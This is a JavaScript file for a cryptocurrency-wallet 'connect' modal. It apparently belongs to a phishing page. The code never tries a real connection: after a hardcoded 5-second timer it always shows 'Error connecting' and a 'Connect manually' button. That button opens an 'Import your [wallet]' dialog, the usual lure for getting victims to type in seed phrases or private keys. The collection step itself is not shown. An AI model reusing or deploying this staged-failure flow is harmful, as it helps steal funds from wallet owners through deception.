// Get the modal elements
var modal = document.getElementById("myModal");
var newModal = document.getElementById("secondMyModal");

// Get the button elements that open the modal
var btns = document.querySelectorAll(".openModalButton");

// Get the <button> elements that close the modal
var buttonSpan = document.getElementsByClassName("close-button")[0];
var items = document.querySelectorAll(".openModalButton .item");

// Get the <span> and <button> elements that close the second modal
var secondModalSpan = document.getElementsByClassName("second-close")[0];
var secondModalButtonSpan = document.getElementsByClassName("second-close-button")[0];

items.forEach(function (item) {
  item.addEventListener("click", function () {
    var logoTitle = this.querySelector(".logo-title").textContent;
    var logoSrc = this.querySelector(".logo").src;

    // Update the modal content
    document.querySelector(".modal-connection-status-2a").textContent = logoTitle;
    document.querySelector(".modal-logo").src = logoSrc;

    document.querySelector(".newModalheader").textContent = `Import your ${logoTitle}`;
    document.querySelector(".modal-logo-2").src = logoSrc;

    modal.style.display = "block";
    resetVortexAndOpen();
  });
});

// Variable to store the timer ID
var vortexTimer;

// Function to revert the effect of openVortex
function revertVortex() {
  document.querySelector('.flex-section-A').innerHTML = `
                <div class="connection-box">
                    <p class="modal-connection-status">connecting...</p>
                </div>
            `;
}

// Function to reset and re-apply vortex when the modal opens
function resetVortexAndOpen() {
  clearTimeout(vortexTimer);
  revertVortex();
  setTimeout(function () {
    openVortex();
  }, 100);
}

// When the user clicks a button, open the modal and apply resetVortexAndOpen effect
btns.forEach(function (btn) {
  btn.onclick = function () {
    modal.style.display = "block";
    resetVortexAndOpen();
  }
});

// When the user clicks on the close-button, close the modal and revert the effect
buttonSpan.onclick = function () {
  modal.style.display = "none";
  revertVortex();
  revertToWalletSupport(); // Revert to the wallet support section
  clearTimeout(vortexTimer);
}

// When the user clicks anywhere outside of the modal, close it and revert the effect
window.onclick = function (event) {
  if (event.target == modal) {
    modal.style.display = "none";
    revertVortex();
    revertToWalletSupport(); // Revert to the wallet support section
    clearTimeout(vortexTimer);
  }
  if (event.target == newModal) {
    newModal.style.display = "none";
    revertToWalletSupport();
  }
}

// Define the openVortex function
function openVortex() {
  clearTimeout(vortexTimer);
  vortexTimer = setTimeout(function () {
    document.querySelector('.flex-section-A').innerHTML = `
                    <div class="connection-box">
                        <p class="modal-connection-status-3a">Error connecting</p>
                        <button class="modal-connect-button-3b">Connect manually</button>
                    </div>
                `;

    document.querySelector('.connection-box').style.border = '2px solid #df2911';
    document.querySelector('.modal-connection-status-3a').style.color = '#df2911';

    document.querySelector(".modal-connect-button-3b").addEventListener("click", function () {
      modal.style.display = "none";
      newModal.style.display = "block";
      closeModalTwo();
    });
  }, 5000);
}

function closeModalTwo() {
  secondModalSpan.onclick = function () {
    newModal.style.display = "none";
    revertToWalletSupport(); // Revert to the wallet support section
  }

  secondModalButtonSpan.onclick = function () {
    newModal.style.display = "none";
    revertToWalletSupport(); // Revert to the wallet support section
  }
}

function revertToWalletSupport() {
  // Return to the wallet support section
  var walletSupportSection = document.querySelector('.wallet-support');
  if (walletSupportSection) {
    walletSupportSection.classList.remove('modal-open');
  }
}
